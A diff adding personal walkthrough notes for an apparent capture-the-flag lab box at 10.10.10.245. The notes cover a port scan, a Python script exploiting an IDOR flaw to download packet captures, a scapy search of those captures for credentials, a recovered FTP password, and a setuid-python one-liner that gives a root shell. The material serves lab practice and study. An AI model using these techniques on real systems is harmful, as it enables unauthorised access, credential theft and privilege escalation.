@@ -1,0 +1,74 @@
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Gunicorn
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+
+
+ftp anonymous doesn't work
+
+app can generate a .pcap file at http://10.10.10.245/data/:id
+    id field in this url is vulnerable to IDOR
+
+download all .pcap files:
+
+    import requests
+
+    GET_URL = lambda x,i: f"http://10.10.10.245/{x}/{i}"
+
+    for i in range(0, 10):
+        url = GET_URL('download', i)
+        r = requests.get(url)
+
+        n = r.headers.get('Content-Disposition').split('filename=')[1].strip('"')
+
+        with open(n, 'wb') as file:
+            for chunk in r.iter_content(chunk_size=8192):
+                file.write(chunk)
+
+        print(n, 'downloaded')
+
+
+find packets with sus keywords:
+
+    from scapy.all import rdpcap, TCP
+
+    for i in range(0, 6):
+        packets = rdpcap(f"{i}.pcap")
+        for packet in packets:
+            payload = bytes(packet[TCP].payload)
+            if payload:
+                if 'password' in payload.decode("utf-8"):
+                    print('passsword in', i)
+                if 'login' in payload.decode("utf-8"):
+                    print('login in', i)
+                if 'admin' in payload.decode("utf-8"):
+                    print('admin in', i)
+
+it finds those keywords in files 0 and 5
+
+to parse the files and look at them individually:
+
+    from scapy.all import rdpcap, TCP
+
+    packets = rdpcap("0.pcap")
+
+    for packet in packets:
+        payload = bytes(packet[TCP].payload)
+        print(payload.decode("utf-8"))
+
+in file 0 we find this
+
+    USER nathan
+    331 Please specify the password.
+    PASS Buck3tH4TF0RM3!
+
+logging in to ftp with this gives user.txt
+we can also log in with this through ssh
+
+linpeas finds that python3.8 has setuid bit
+
+import os; os.setuid(0); os.system("/bin/sh") gives root shell
+
+gg
